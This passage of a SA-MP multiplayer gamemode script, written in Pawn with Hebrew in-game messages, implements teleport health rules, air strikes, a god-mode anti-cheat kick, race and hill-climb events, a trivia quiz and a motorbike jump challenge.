if(PlayerInfo[playerid][Level] == 4 && healthteleportion < 55.0) return CreateHealth[playerid]=55,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 5 && healthteleportion < 50.0) return CreateHealth[playerid]=50,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 6 && healthteleportion < 45.0) return CreateHealth[playerid]=45,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 7 && healthteleportion < 40.0) return CreateHealth[playerid]=40,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 8 && healthteleportion < 35.0) return CreateHealth[playerid]=35,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 9 && healthteleportion < 30.0) return CreateHealth[playerid]=30,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 10 && healthteleportion < 25.0)return CreateHealth[playerid]=25,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 11 && healthteleportion < 20.0)return CreateHealth[playerid]=20,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 12 && healthteleportion < 15.0)return CreateHealth[playerid]=15,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 13 && healthteleportion < 10.0)return CreateHealth[playerid]=10,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;
if(PlayerInfo[playerid][Level] == 14 && healthteleportion < 5.0) return CreateHealth[playerid]=5,format(string, sizeof(string), ".%d על מנת להשתגר, רמתך הנוחכית דורשת לפחות מינימום של אחוזי חיים שהם",CreateHealth[playerid]),SendClientMessage(playerid, red, string),0;

if(GetPlayerState(playerid) == 2 && WithVehicle == 1)
{
LinkVehicleToInterior(GetPlayerVehicleID(playerid),Interior);
SetVehiclePos(GetPlayerVehicleID(playerid), x, y, z);
SetVehicleZAngle(GetPlayerVehicleID(playerid), a);
}
else
{
SetPlayerInterior(playerid,Interior);
SetPlayerPos(playerid, x, y, z);
SetPlayerFacingAngle(playerid, a);
}
return 1;
}
//=/AirStrike/===
forward AirStrikeExplode(playerid);
public AirStrikeExplode(playerid)
{
if(Explodeion[playerid] == 1)
{
CreateExplosion(PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],10,10);
DestroyObject(AirStrikeTil[playerid]);
KillTimer(AirStrikeExplodes[playerid]);
SetTimerEx("againis",30*60,0,"i",playerid);
}
if(Explodeion[playerid] == 2)
{
CreateExplosion(PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],10,10);
SetTimerEx("mexlop",1500,0,"i",playerid);
DestroyObject(AirStrikeTil[playerid]);
KillTimer(AirStrikeExplodes[playerid]);
SetTimerEx("againis",30*60,0,"i",playerid);
}
if(Explodeion[playerid] == 3)
{
CreateExplosion(PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],10,10);
SetTimerEx("mexlop",1500,0,"i",playerid);
DestroyObject(AirStrikeTil[playerid]);
KillTimer(AirStrikeExplodes[playerid]);
SetTimerEx("againis",30*60,0,"i",playerid);
}

return 1;
}
forward mexlop(playerid);
public mexlop(playerid)
{
if(Explodeion[playerid] == 2)
{
CreateExplosion(PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],10,10);
DestroyObject(AirStrikeTil[playerid]);
DestroyObject(AirStrikeTil2[playerid]);
DestroyObject(AirStrikeTil3[playerid]);
Explodeion[playerid] =0;
return 1;
}
if(Explodeion[playerid] == 3)
{
CreateExplosion(PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],10,10);
SetTimerEx("mexlop2",1200,0,"i",playerid);
DestroyObject(AirStrikeTil[playerid]);
DestroyObject(AirStrikeTil2[playerid]);
DestroyObject(AirStrikeTil3[playerid]);

return 1;
}
return 1;
}
forward mexlop2(playerid);
public mexlop2(playerid)
{
CreateExplosion(PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],10,10);
DestroyObject(AirStrikeTil[playerid]);
DestroyObject(AirStrikeTil2[playerid]);
DestroyObject(AirStrikeTil3[playerid]);
Explodeion[playerid] = 0;
return 1;
}
forward againis(playerid);
public againis(playerid) return AirStrikeInWar[playerid] = 0;
forward SpawnPlayer2(playerid);
public SpawnPlayer2(playerid)
{
if(IsPlayerInAnyVehicle(playerid))
{
RemovePlayerFromVehicle(playerid);
SetTimerEx("SpawnPlayer3",4000,0,"i",playerid);
}
if(!IsPlayerInAnyVehicle(playerid))
{
SetTimerEx("SpawnPlayer3",4000,0,"i",playerid);
}
return 1;
}

new Float:HealthCheat;
new Float:Zambora[MAX_PLAYERS];
forward GodModCheack(playerid);
public GodModCheack(playerid)
{
SetPlayerArmour(playerid,0.0);
SetPlayerHealth(playerid,100);
SetTimerEx("GodModCheack2",4000,0,"i",playerid);
Zambora[playerid] = 0;
return 1;
}
forward GodModCheack2(playerid);
public GodModCheack2(playerid)
{
GetPlayerHealth(playerid,HealthCheat);
Zambora[playerid] = HealthCheat;
new Float:PosGod[3];
GetPlayerPos(playerid,PosGod[0],PosGod[1],PosGod[2]);
CreateExplosion(PosGod[0],PosGod[1],PosGod[2],10,10);
SetTimerEx("GodModCheack3",4000,0,"i",playerid);
return 1;
}

forward GodModCheack3(playerid);
public GodModCheack3(playerid)
{
GetPlayerHealth(playerid,HealthCheat);
if(HealthCheat < 0.1) return 0;
if(HealthCheat < Zambora[playerid]) return 0;
if(HealthCheat == Zambora[playerid])
{
new str[256];
SendClientMessage(playerid,red,"God Mod Hack. מערכת האנטי צ'יט זיההתה אצלך, צ'יט מסוג");
SendClientMessage(playerid,red,".כעת תוצא מהשרת,במידה זה יחזור עליו שנית, יש סיכוי להרחקה מהשרת");
format(str, sizeof(str), "Anti Hackers || %s has been kicked for using God Mod Hack." , GetName(playerid));
SendClientMessageToAll(red , str);
Kick(playerid);
}
return 1;
}


//=[Bike]
forward BikeStart();
public BikeStart()
{
new string[256];
SendClientMessageToAll(WHITE,"[_____________גאטר - מירוץ אופנועים_____________]");
SendClientMessageToAll(0xF6F658FF, "! נפתחה הרשמה לקרב מירוצים, סוג מירוץ: אופנועים הזדרזו להירשם");
format(string,sizeof(string),".$3000:המנצח יזכה בפרס כספי של");
SendClientMessageToAll(0xF6F658FF,string);
SendClientMessageToAll(0x0F6A0FF, "/races join :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");
BikeWinner = 1;
BikePlayers = 0;
BikeOn = 1; CountBiker = 60;
CountBikerdown();
return 1;
}


forward CountBikerdown();
public CountBikerdown()
{
for(new i = 0; i < MAX_PLAYERS; i++)
if (CountBiker > 0)
{
new String[256];
format(String, 256,"~w~%d",CountBiker);
GameTextForAll(String,1000,6);
--CountBiker;
return SetTimer("CountBikerdown", 1000, 0);
}
if(CountBiker < 1)
{
for (new i=0; i<200; i++)
{
if (IsPlayerConnected(i))
{
new string[256];
SendClientMessage(i,red,"[______________מירוץ מאורגן - אופנועים______________]");
format(string,sizeof(string)," %d :מס' משתתפים",BikePlayers);
SendClientMessage(i,0xE21E1EFF,string);
SendClientMessage(i,0xE21E1EFF,"המנצח יקבל סכום מכובד של 3000$");
SendClientMessage(i,red,".--------------------------------------");
GameTextForPlayer(i," ~y~h~[]Races Start~y~h~[] ",1000,4);
if(InBike[i] > 0)
{
TogglePlayerControllable(i, 1);
}
}
}
}
return 1;
}

stock OutDrift(playerid)
{
if(indrift[playerid] == 0)return 0;
if(indrift[playerid] == 1)
{
new string[256];
format(string,sizeof(string),".-פרש מהמירוץ דריפט האישי,%s",GetName(playerid));
SendClientMessageToAll(WHITE,string);
DisablePlayerRaceCheckpoint(playerid);
driftwinner[playerid]=0;
DriftInvite[playerid] =0;
IfInvite[playerid] =0;
indrift[playerid] =0;
DisablePlayerRaceCheckpoint(playerid);
DriftNoNow = 0;
PrivateCP[playerid] = 0;
DriftInvite[playerid] = 0;
IfInvite[playerid] = 0;
new vehicleidsa = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,0);
SetVehicleVirtualWorld(vehicleidsa,0);

for(new Drifter=0; Drifter<MAX_PLAYERS; Drifter++)
{
if(indrift[Drifter] == 1)
{
format(string,sizeof(string),"!ניצח אוטומאטית במירוץ דריפט ,%s",GetName(Drifter));
SendClientMessage(Drifter,COLOR_LIGHTGREEN,string);
LACY_GiveMoney(playerid,driftwinner[Drifter]);
driftwinner[Drifter]=0;
DriftInvite[Drifter] =0;
IfInvite[Drifter] =0;
indrift[Drifter] =0;
DisablePlayerRaceCheckpoint(Drifter);
DriftNoNow = 0;
PrivateCP[Drifter] = 0;
DriftInvite[Drifter] = 0;
IfInvite[Drifter] = 0;
new vehicleids = GetPlayerVehicleID(Drifter);
SetPlayerVirtualWorld(Drifter,0);
SetVehicleVirtualWorld(vehicleids,0);
}
}
}
return 1;
}




//===[Challenge]==============================================================
//==================================ChaStart====================================
forward ChaStarted();
public ChaStarted()
{
new string[256];
SendClientMessageToAll(WHITE,"[_____________גאטר - טיפוס על ההר_____________]");
SendClientMessageToAll(0xF6F658FF, "! נפתחה הרשמה לקרב מאורגן, הזדרזו להירשם");
format(string,sizeof(string),".$%d :פרס למנצח מתחיל מסכום של",ChaPras);
SendClientMessageToAll(0xF6F658FF,string);
SendClientMessageToAll(0x0F6A0FF, "/Cha :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");
ChaOn = 1; ChaPlayers = 0;
CountChallenge = 60; CountChallengedown(); CountChallengeFuc = 1;
return 1; }
//==================================CountChallengedown===================================
forward CountChallengedown();
public CountChallengedown() {
if(CountChallenge == 30) {
SendClientMessageToAll(red, "Chllenge Etgar Open To Join Doing: - /Cha (TYPE: Challenge).");
} else if(CountChallenge == 15) {
SendClientMessageToAll(red, "Chllenge Etgar Open To Join Doing: - /Cha (TYPE: Challenge).");
}
new String[256];
format(String, 256,"~w~%d",CountChallenge);
for(new i = 0; i < MAX_PLAYERS; i++)

GameTextForAll(String,1000,6);
if(CountChallenge > 0) {
--CountChallenge;
SetTimer("CountChallengedown", 1000, 0);
} else {
if(CountChallengeFuc == 1) {
TeleportPlayerToCha();
if(ChaNoobs == 1) {
CountChallenge = 10; CountChallengedown(); CountChallengeFuc = 2;
} }
if(CountChallengeFuc == 2 && CountChallenge <= 0) {
UFALLCHA();
} } }
//==================================UFALLCHA====================================
forward UFALLCHA();
public UFALLCHA() {
for(new i = 0;i<MAX_PLAYERS;i++) {
if(PChain[i] == 1) {
TogglePlayerControllable(i, 1);
SetCameraBehindPlayer(i);
} } }
//=============================TeleportPlayerToCha==============================
forward TeleportPlayerToCha();
public TeleportPlayerToCha() {
if(ChaPlayers < MinChaPlayers) {
ChaEnd(0);
return 1; }
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InCha[i] == 1)
{

new string[256];
SendClientMessage(i,WHITE,"[______________!גאטר - טיפוס על הר______________]");
format(string,sizeof(string)," %d :מס' משתתפים",ChaPlayers),SendClientMessage(i,0xE21E1EFF,string);
format(string,sizeof(string)," $%d :סכום זכייה שנקבע על ידי השחקנים הוא",ChaPras),SendClientMessage(i,0xE21E1EFF,string);
SendClientMessage(i,WHITE,".--------------------------------------");
ResetPlayerWeapons(i);
new rand = random(sizeof(ChaSpawn));
SetPlayerPos(i, ChaSpawn[rand][0], ChaSpawn[rand][1], ChaSpawn[rand][2]);
SetPlayerVirtualWorld(i,0);
ResetPlayerWeapons(i);
ResetPlayerWeapons(i);
SetPlayerArmour(i, 100.0);
SetPlayerHealth(i, 100.0);
ChaStart = 1; PChain[i] = 1; ChaNoobs = 1;
TogglePlayerControllable(i, 0);
CHASECX = SetTimer("WinnerCha",1000, 1);
CHATIME = SetTimer("Check",1000, 1);
} }
return 1; }

//===================================ChaEnd=====================================
forward ChaEnd(status);
public ChaEnd(status) {
if(status == 0) {
ChaOn = 0; ChaPlayers = 0;
KillTimer(CHATIME);
KillTimer(CHASECX);
for(new i = 0;i<MAX_PLAYERS;i++)
{
InCha[i] = 0;  PChain[i] = 0; ChaStart = 0; ChaNoobs = 0;
for(new Chei = 0; Chei <CHA_OBJECT; Chei++)
{
DestroyStreamObject(CheDelObject[Chei]);
}
}
return 1;
}
else if(status == 1) {
ChaOn = 0; ChaPlayers = 0;
LACY_GiveMoney(ChaWinner, ChaPras);
GetPlayerName(ChaWinner, playername, sizeof(playername));
KillTimer(CHATIME);
KillTimer(CHASECX);
ResetPlayerWeapons(ChaWinner);
SetPlayerInterior(ChaWinner, 0);
SetPlayerPos(ChaWinner, 2028.6577,1341.8792,10.8203);
SendClientMessageToAll(red,"[________ האתגר טיפוס - מנצח ________]");
SendClientMessageToAll(0xE21E1EFF, "!הקרב הסתיים");
format(kboobcha, sizeof(kboobcha), "$%d :הגיע לסוף ההר בהצלחה ! זכה בפרס של כ %s", ChaPras, playername);
SendClientMessageToAll(0xE21E1EFF, kboobcha);
SendClientMessageToAll(red, "------------------------------");


for(new Chei = 0; Chei <CHA_OBJECT; Chei++)
{
DestroyStreamObject(CheDelObject[Chei]);
}
for(new i = 0;i<MAX_PLAYERS;i++)
{
InCha[i] = 0; ChaStart = 0; PChain[i] = 0; ChaNoobs = 0;
}
return 1;
}
else if(status == 2)
{
format(kboobcha, sizeof(kboobcha), ".ביטל את האתגר טיפוס \"%s\" האדמין ", Chaadminsname);
SendClientMessageToAll(lblue, kboobcha);
ChaPlayers = 0;
ChaNoobs = 0; ChaStart = 0;
ChaOn = 0;
CountChallenge = 0; CountChallengeFuc = 0;
KillTimer(CHATIME);
KillTimer(CHASECX);
for(new i = 0;i<MAX_PLAYERS;i++) {
InCha[i] = 0; PChain[i] = 0;
}
return 1;
}
else if(status == 3)
{
ChaPlayers = 0;
ChaNoobs = 0; ChaStart = 0;
ChaOn = 0;
CountChallenge = 0; CountChallengeFuc = 0;
KillTimer(CHATIME);
KillTimer(CHASECX);
SendClientMessageToAll(red, ".האתגר טיפוס הופסק, סיבה: אף אחד לא יגיע לסוף ההר");
for(new Chei = 0; Chei <CHA_OBJECT; Chei++)
{
DestroyStreamObject(CheDelObject[Chei]);
}
for(new i = 0;i<MAX_PLAYERS;i++)
{
InCha[i] = 0; PChain[i] = 0;
}
return 1;
}
return 1; }
//===================================Check======================================
forward Check();
public Check() {
if(ChaStart == 1) {
if(ChaPlayers == 0) {
for(new i = 0;i<MAX_PLAYERS;i++) {
if(InCha[i] == 1) {
ChaWinner = i; ChaEnd(3);
} } } } return 1; }

forward WinnerCha();
public WinnerCha() {
if(ChaStart == 1)
{
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InCha[i] == 1)
{
if(PlayerToPoint(8.0,i,1626.7010,-2286.8787,94.1328))
{
ChaWinner = i; ChaEnd(1);
}
}
}
}
return 1;
}

//=[AirBreack]

public OnGetPlayerKeys()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		new Keys, UpDown, LeftRight;
		GetPlayerKeys(i, Keys, UpDown, LeftRight);

		if(IsPlayerInAnyVehicle(i) == 1)
		{
			if(AirBreakVar[i] == 1)
			{
				AirBreakVar[i] = 0;
				TogglePlayerControllable(i, 1);
			}
		}

		if(AirBreakVar[i] == 1)
		{
			new Float:X, Float:Y, Float:Z, Float:A;
			GetPlayerPos(i, X, Y, Z);
			GetPlayerFacingAngle(i, A);

			if(UpDown == KEY_UP)
			{
				X += (SetDistance[i] * floatsin(-A, degrees)); //Made by Y_Less
				Y += (SetDistance[i] * floatcos(-A, degrees)); //Made by Y_Less

				SetPlayerPos(i, X, Y, Z);
				SetCameraBehindPlayer(i);
				return 1;
			}

			if(UpDown == KEY_DOWN)
			{
				X -= (SetDistance[i] * floatsin(-A, degrees)); //Made by Y_Less
				Y -= (SetDistance[i] * floatcos(-A, degrees)); //Made by Y_Less

				SetPlayerPos(i, X, Y, Z);
				SetCameraBehindPlayer(i);
				return 1;
			}

			if(LeftRight == KEY_RIGHT)
			{
				A += -90;
				X += floatmul(floatsin(-A, degrees), SetDistance[i]); // Made by Nero_3D
				Y += floatmul(floatcos(-A, degrees), SetDistance[i]); // Made by Nero_3D

				SetPlayerPos(i, X, Y, Z);
				SetCameraBehindPlayer(i);
				return 1;
			}

			if(LeftRight == KEY_LEFT)
			{
				A += 90;
				X += floatmul(floatsin(-A, degrees), SetDistance[i]); // Made by Nero_3D
				Y += floatmul(floatcos(-A, degrees), SetDistance[i]); // Made by Nero_3D

				SetPlayerPos(i, X, Y, Z);
				SetCameraBehindPlayer(i);
				return 1;
			}

			if(Keys == KEY_JUMP)
			{
				SetPlayerPos(i, X, Y, Z + SetDistance[i]);
				SetCameraBehindPlayer(i);
				return 1;
			}

			if(Keys == KEY_SPRINT)
			{
				SetPlayerPos(i, X, Y, Z - SetDistance[i]);
				SetCameraBehindPlayer(i);
				return 1;
			}

			if(Keys == KEY_ANALOG_RIGHT)
			{
				SetPlayerFacingAngle(i, A - (SetDistance[i] * 4));
				SetCameraBehindPlayer(i);
				return 1;
			}

			if(Keys == KEY_ANALOG_LEFT)
			{
				SetPlayerFacingAngle(i, A + (SetDistance[i] * 4));
				SetCameraBehindPlayer(i);
				return 1;
			}
		}
	}
	return 1;
}


stock IsNickValid(const nick[])
{
	new strlen_nick = strlen(nick);
	if (strlen_nick > 16) return false;
	for (new i = 0; i < strlen_nick; ++i)
	{
		switch (nick[i])
		{
			case 'A' .. 'Z': { }
			case 'a' .. 'z': { }
			case '0' .. '9': { }
			case '[', ']', '_': { }
			default: return false;
		}
	}
	return true;
}

stock IsNameValid(const name[]) {
	if(strlen(name) > 16) return false;
	if(strlen(name) < 3) return false;
	new allow[] = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O',
	'P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o',
	'p','q','r','s','t','u','v','w','x','y','z','[',']','_',0,1,2,3,4,5,6,7,8,9};
	for(new n=0; n<sizeof(allow); n++) if(strfind(name,allow[n],false)!=-1) return false;
	return true;
}

/*
forward CloseHqIDF2();
forward CloseHqIDF();
forward CloseHqIDF3();
public CloseHqIDF()
{
MoveStreamObject(IDF1,-1895.055664, 1344.116089, 8.960903,3);
return 1;
}
public CloseHqIDF2()
{
MoveStreamObject(IDF2, -1917.389160, 1391.598145, 8.954241,3);
return 1;
}
public CloseHqIDF3()
{
MoveStreamObject(IDF3,-1908.747437, 1376.474854, 6.204057,2);
return 1;
}
*/
forward SpawnWeaponAndGW(playerid);
public SpawnWeaponAndGW(playerid)
{
if(PlayerInfo[playerid][MP5] > 0)
{
GivePlayerWeapon(playerid,29,PlayerInfo[playerid][Knife]);
}
if(PlayerInfo[playerid][AK47] > 0)
{
GivePlayerWeapon(playerid,30,PlayerInfo[playerid][Knife]);
}

if(PlayerInfo[playerid][Katana] > 0)
{
GivePlayerWeapon(playerid,8,PlayerInfo[playerid][Katana]);
}

if(PlayerInfo[playerid][CombatShotGun] > 0)
{
GivePlayerWeapon(playerid,27,PlayerInfo[playerid][CombatShotGun]);
}
if(PlayerInfo[playerid][CRifle] > 0)
{
GivePlayerWeapon(playerid,34,PlayerInfo[playerid][CRifle]);
}
if(PlayerInfo[playerid][MicroSMG] > 0)
{
GivePlayerWeapon(playerid,28,PlayerInfo[playerid][MicroSMG]);
}
if(PlayerInfo[playerid][Tec9] > 0)
{
GivePlayerWeapon(playerid,32,PlayerInfo[playerid][Tec9]);
}
if(PlayerInfo[playerid][M4] > 0)
{
GivePlayerWeapon(playerid,31,PlayerInfo[playerid][M4]);
}
if(PlayerInfo[playerid][Knife] > 0)
{
GivePlayerWeapon(playerid,4,PlayerInfo[playerid][Knife]);
}
if(PlayerInfo[playerid][Colt] > 0)
{
GivePlayerWeapon(playerid,22,PlayerInfo[playerid][Colt]);
}
if(PlayerInfo[playerid][Sawn] > 0)
{
GivePlayerWeapon(playerid,26,PlayerInfo[playerid][Sawn]);
}
return 1;
}

//==============================================================================
stock GetPlayerXFile(playerid) {
	new string[256];
	format(string,256,"/xadmin/Users/%s.ini",udb_encode(GetName(playerid)));
	return string;
}
//==============================================================================
stock IsPlayerXAdmin(playerid,level) return (dini_Int(GetPlayerXFile(playerid),"Level") > level)? 1 : 0;
//==[Trivia]================
public Maths()
{
	new string[256], addsubtext1[10], addsubtext2[10];

	new temp1;

	new number1 = random(100);
	new number2 = random(100);
	new number3 = random(100);
	new addsubnumb1 = random(2);
	new addsubnumb2 = random(2);

	if(addsubnumb1 == 0)
	{
		score = score + 10;

		format(addsubtext1, sizeof(addsubtext1), "-");
		temp1 = number1 - number2;
	}
	else if(addsubnumb1 == 1)
	{
	    score = score + 5;

		format(addsubtext1, sizeof(addsubtext1), "+");
		temp1 = number1 + number2;
	}

	if(addsubnumb2 == 0)
	{
	    score = score + 10;

		format(addsubtext2, sizeof(addsubtext2), "-");
		answer = temp1 - number3;
	}
	else if(addsubnumb2 == 1)
	{
		score = score + 5;

		format(addsubtext2, sizeof(addsubtext2), "+");
		answer = temp1 + number3;
	}
	
	format(string, sizeof(string), "Matematika - %d%s%d%s%d.",number1, addsubtext1, number2, addsubtext2, number3);
    SendClientMessageToAll(COLOR_GREEN, string);
    SendClientMessageToAll(COLOR_PINK,"/ha [Answer] :על מנת לענות על חידון החשבון בצע/י");
	answered = 0;
	return 1;
}

forward CountkilljumpJumpKill();
public CountkilljumpJumpKill()
{
    if(RaceJumpKill != -1 && IsPlayerInVehicle(RaceJumpKill, Motor))
        {
            Countkilljump++;
            if(Countkilljump == 1) GameTextForPlayer(RaceJumpKill, "~w~4", 3000, 6);
            if(Countkilljump == 2) GameTextForPlayer(RaceJumpKill, "~w~3", 3000, 6);
            if(Countkilljump == 3) GameTextForPlayer(RaceJumpKill, "~w~2", 3000, 6);
            if(Countkilljump == 4) GameTextForPlayer(RaceJumpKill, "~w~1", 3000, 6);
            if(Countkilljump == 5)
            {
                KillTimer(TimerJumpkill1);
                TimerJumpkill1 = -1;
                GameTextForPlayer(RaceJumpKill, "~y~Go!", 2000, 6);
                        TogglePlayerControllable(RaceJumpKill, 1);
                MaxTimer = SetTimer("MaxTime", 1000, 1);
                TimerJumpkill2 = SetTimer("CheckForLine", 100, 1);
                        TimeLeft = 20;
                }
        }
}

forward CheckForLine();
public CheckForLine()
{
    if(RaceJumpKill != -1 && IsPlayerInVehicle(RaceJumpKill, Motor))
        {
            new Float:X, Float:Y, Float:Z;
                GetPlayerPos(RaceJumpKill, X, Y, Z);
            if(X < 51.191391)
                {
                    if(IsBikeInArea(Motor, -100.0912, 2497.1504, 55.191391, 2508.6316))
                        {
                            KillTimer(TimerJumpkill2);
                            TimerJumpkill2 = -1;
                            KillTimer(MaxTimer);
                            MaxTimer = -1;
                            TimerJumpkill3 = SetTimer("CheckForLanding", 20, 1);
                        }
                }
        }
}


forward CheckForLanding();
public CheckForLanding()
{
        if(RaceJumpKill != -1 && IsPlayerInVehicle(RaceJumpKill, Motor))
        {
                new Float:X, Float:Y, Float:Z, tmpX;
                GetPlayerPos(RaceJumpKill, X, Y, Z);
            tmpX = floatround(X);
            if(tmpX != LasttmpX)
            {
                LasttmpX = tmpX;
                        ExplotionCheck(tmpX);
                }
                if(!IsBikeInArea(Motor, -100.0912, 2497.1504, 55.191391, 2508.6316))
                {
                    GameTextForPlayer(RaceJumpKill, "~r~Failed!", 5000, 6);
                        KillTimer(TimerJumpkill3);
                        SetTimer("EndJumpKill", 5000, 0);
                }
                 if(Z < 17.53)
                {
                    KillTimer(TimerJumpkill3);
                    TimerJumpkill3 = -1;
                    Distance = floatsub(51.191391, X);
                        if(Distance > HS[0]) //Player = 1st
                        {
                            HS[2] = HS[1];
                            HS[1] = HS[0];
                            HS[0] = Distance;
                            HSN[2] = HSN[1];
                            HSN[1] = HSN[0];
                            GetPlayerName(RaceJumpKill, HSN[0], MAX_PLAYER_NAME);
                        }
                        else if(Distance > HS[1] && Distance <= HS[0]) //Player = 2nd
                        {
                            HS[2] = HS[1];
                            HS[1] = Distance;
                                HSN[2] = HSN[1];
                            GetPlayerName(RaceJumpKill, HSN[1], MAX_PLAYER_NAME);
                        }
                        else if(Distance > HS[2] && Distance <= HS[1]) //Player = 3rd
                        {
                            HS[2] = Distance;
                            GetPlayerName(RaceJumpKill, HSN[2], MAX_PLAYER_NAME);
                        }
                        if(Distance > dini_Float(PERSONALFILE, GetName(RaceJumpKill)))
                        {
                            dini_FloatSet(PERSONALFILE, GetName(RaceJumpKill), Distance);
                        }

						new str[256];
                SendClientMessage(RaceJumpKill, red, ":רשימת האנשים שעשו את קפיצה ההתאבדות בצורה הטובה ביותר");
                format(str, 128, "#1:   %.4f     %s", HS[0], HSN[0]);
                SendClientMessage(RaceJumpKill, COLOR_PINK, str);
                format(str, 128, "#2:   %.4f     %s", HS[1], HSN[1]);
                SendClientMessage(RaceJumpKill, COLOR_PINK, str);
                format(str, 128, "#3:   %.4f     %s", HS[2], HSN[2]);
                SendClientMessage(RaceJumpKill, COLOR_PINK, str);
                SendClientMessage(RaceJumpKill, COLOR_PINK, " ");
                format(str, 128, "%.4f :השיא שלך", dini_Float(PERSONALFILE, GetName(RaceJumpKill)));
                SendClientMessage(RaceJumpKill, COLOR_PINK, str);
                        SetTimer("EndJumpKill", 5*1000, 0);
                        SetPlayerCameraPos(RaceJumpKill, -121.3866, 2504.7371, 30.0306);
                        SetPlayerCameraLookAt(RaceJumpKill, X, Y, Z);
                }
        }
        return 1;
}

IsBikeInArea(Bike, Float:MinX, Float:MinY, Float:MaxX, Float:MaxY)
{
        new Float:X1, Float:Y1, Float:Z1;

        GetVehiclePos(Bike, X1, Y1, Z1);
        if(X1 >= MinX && X1 <= MaxX&& Y1 >= MinY && Y1 <= MaxY)
        {
                return 1;
        }
        return 0;
}

stock RemoveAllPlayersFromVehicle(vehicleID)
{
        for(new i; i<MAX_PLAYERS; i++)
        {
            if(IsPlayerConnected(i))
                {
                    if(IsPlayerInVehicle(i, vehicleID))
                        {
                            RemovePlayerFromVehicle(i);
                        }
                }
        }
}

forward EndJumpKill();
public EndJumpKill()
{
        if(TimerJumpkill1 != -1)
        {
        KillTimer(TimerJumpkill1);
        TimerJumpkill1 = -1;
        }
        if(TimerJumpkill2 != -1)
        {
        KillTimer(TimerJumpkill2);
        TimerJumpkill2 = -1;
        }
        if(TimerJumpkill3 != -1)
        {
        KillTimer(TimerJumpkill3);
        TimerJumpkill3 = -1;
        }
        if(MaxTimer != -1)
        {
            KillTimer(MaxTimer);
            MaxTimer = -1;
        }

        RemoveAllPlayersFromVehicle(Motor);
        DestroyVehicle(Motor);

        for(new i; i<45; i++)
        {
        DestroyPlayerObject(RaceJumpKill,DestroyPlayerObject2[i]);
        }
        SetCameraBehindPlayer(RaceJumpKill);
        RaceJumpKill = -1;
}

forward MaxTime();
public MaxTime()
{
        TimeLeft--;
        if(TimeLeft == 0)
        {
            KillTimer(MaxTimer);
            MaxTimer = -1;
            KillTimer(TimerJumpkill3);
                GameTextForPlayer(RaceJumpKill, "~r~Time's Up!", 5000, 6);
                SetTimer("EndJumpKill", 5000, 0);
        }
}
ExplotionCheck(XX)
{
        if(48 < XX < 52){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(38 < XX < 42){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5);}
        else if(28 < XX < 32){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(18 < XX < 22){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(8 < XX < 12){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
        else if(-2 < XX < 2){ CreateExplosion(XX-30, 2508.6316, 18.0, 11, 5); CreateExplosion(XX-30, 2497.1504, 18.0, 11, 5); }
